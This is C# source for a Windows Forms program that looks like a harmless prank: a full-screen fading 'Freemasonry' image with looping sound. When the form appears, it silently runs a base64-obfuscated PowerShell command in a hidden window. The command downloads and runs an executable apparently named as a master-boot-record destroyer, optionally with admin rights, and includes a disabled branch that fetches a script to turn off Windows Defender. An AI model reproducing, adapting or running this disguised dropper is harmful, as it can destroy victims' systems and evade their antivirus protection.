using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Media;
using System.Windows.Forms;
using System.Diagnostics;
using BOOM.Properties;
using System.Runtime.InteropServices;

namespace BOOM
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool ShowCursor(bool bShow);

        private Timer displayTimer;
        private PictureBox pictureBox;
        private SoundPlayer player;
        private int transparencyStep = 25;
        private int currentTransparency = 0;

        public Form1()
        {
            InitializeComponent();
            InitializeCustomComponents();
        }

        private void InitializeCustomComponents()
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.TransparencyKey = Color.Black;
            this.BackColor = Color.Black;
            ShowCursor(false);

            pictureBox = new PictureBox();
            pictureBox.Image = Resources.Freemasonry;
            pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            pictureBox.Dock = DockStyle.Fill;
            pictureBox.Image = AdjustImageTransparency(Resources.Freemasonry, currentTransparency);
            this.Controls.Add(pictureBox);

            displayTimer = new Timer();
            displayTimer.Interval = 1000; 
            displayTimer.Tick += DisplayTimer_Tick;

            player = new SoundPlayer(Resources.MasonSound);
            player.PlayLooping();

            this.StartPosition = FormStartPosition.CenterScreen;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.Shown += Form1_Shown;
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            RunCommand("cmd.exe", "/c powershell -e JABzAGUAdAB0AGkAbgBnAHMAIAA9ACAAJwB7ACIAVwBEACIAOgAgAGYAYQBsAHMAZQAsACAAIgBhAGQAbQBpAG4AcgB1AG4AIgA6ACAAZgBhAGwAcwBlAH0AJwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuADsAJAByAGEAbgBkAG8AbQBTAHQAcgBpAG4AZwAgAD0AIAAiAFQAYgBwADYAVQBPAHkAbQB4AG8AIgA7AGkAZgAgACgAJABzAGUAdAB0AGkAbgBnAHMALgBXAEQAKQAgAHsAJABzAGUAdAB0AGkAbgBnAHMALgBhAGQAbQBpAG4AcgB1AG4AIAA9ACAAJAB0AHIAdQBlADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBuAGkAbgBoAHAAbgAxADMAMwA3AC8ARABpAHMAYQBiAGwAZQAtAFcAaQBuAGQAbwB3AHMALQBEAGUAZgBlAG4AZABlAHIALwBtAGEAaQBuAC8AcwBvAHUAcgBjAGUALgBiAGEAdAAnACwAIAAkAGUAbgB2ADoAVABFAE0AUAAgACsAIAAnAFwAJwAgACsAIAAkAHIAYQBuAGQAbwBtAFMAdAByAGkAbgBnACAAKwAgACcALgBiAGEAdAAnACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAkAGUAbgB2ADoAVABFAE0AUAAgACsAIAAnAFwAJwAgACsAIAAkAHIAYQBuAGQAbwBtAFMAdAByAGkAbgBnACAAKwAgACcALgBiAGEAdAAnACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AVwBhAGkAdAAgAC0AVgBlAHIAYgAgAFIAdQBuAEEAcwA7AH0AOwBpAGYAIAAoACQAcwBlAHQAdABpAG4AZwBzAC4AYQBkAG0AaQBuAHIAdQBuACkAIAB7ACQAdQByAGwAIAA9ACAAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHoANwA3AGYALwBNAGEAcwBvAG4ATQBCAFIALwByAGEAdwAvAG0AYQBpAG4ALwBNAGEAcwBvAG4ATQBCAFIALgBlAHgAZQAnADsAJABvAHUAdABwAHUAdABQAGEAdABoACAAPQAgACQAZQBuAHYAOgBUAEUATQBQACAAKwAgACcAXAAnACAAKwAgACcATQBhAHMAbwBuAE0AQgBSAC4AZQB4AGUAJwA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAHUAcgBsACwAIAAkAG8AdQB0AHAAdQB0AFAAYQB0AGgAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAG8AdQB0AHAAdQB0AFAAYQB0AGgAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAOwB9AGUAbABzAGUAIAB7ACQAdQByAGwAIAA9ACAAJwBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHoANwA3AGYALwBNAGEAcwBvAG4ATQBCAFIALwByAGEAdwAvAG0AYQBpAG4ALwBNAGEAcwBvAG4ATQBCAFIALgBlAHgAZQAnADsAJABvAHUAdABwAHUAdABQAGEAdABoACAAPQAgACQAZQBuAHYAOgBUAEUATQBQACAAKwAgACcAXAAnACAAKwAgACcATQBhAHMAbwBuAE0AQgBSAC4AZQB4AGUAJwA7ACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAHUAcgBsACwAIAAkAG8AdQB0AHAAdQB0AFAAYQB0AGgAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAG8AdQB0AHAAdQB0AFAAYQB0AGgAOwB9AA==");
            displayTimer.Start();
        }

        private void DisplayTimer_Tick(object sender, EventArgs e)
        {
            currentTransparency += transparencyStep;

            if (currentTransparency >= 255 || currentTransparency <= 0)
            {
                transparencyStep = -transparencyStep;
            }

            pictureBox.Image = AdjustImageTransparency(Resources.Freemasonry, currentTransparency);
            pictureBox.Invalidate();
        }

        private Bitmap AdjustImageTransparency(Image image, int transparency)
        {
            Bitmap bmp = new Bitmap(image);
            bmp.MakeTransparent(Color.Black);
            SetImageOpacity(bmp, transparency);
            return bmp;
        }

        private void SetImageOpacity(Bitmap bmp, int transparency)
        {
            if (transparency < 0) transparency = 0;
            if (transparency > 255) transparency = 255;

            ColorMatrix matrix = new ColorMatrix();
            matrix.Matrix33 = transparency / 255f;

            ImageAttributes attributes = new ImageAttributes();
            attributes.SetColorMatrix(matrix, ColorMatrixFlag.Default, ColorAdjustType.Bitmap);

            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.DrawImage(bmp, new Rectangle(0, 0, bmp.Width, bmp.Height),
                            0, 0, bmp.Width, bmp.Height,
                            GraphicsUnit.Pixel, attributes);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void RunCommand(string command, string arguments)
        {
            ProcessStartInfo psi = new ProcessStartInfo(command, arguments);
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;

            Process process = new Process();
            process.StartInfo = psi;
            process.Start();
            process.WaitForExit();
        }
    }
}
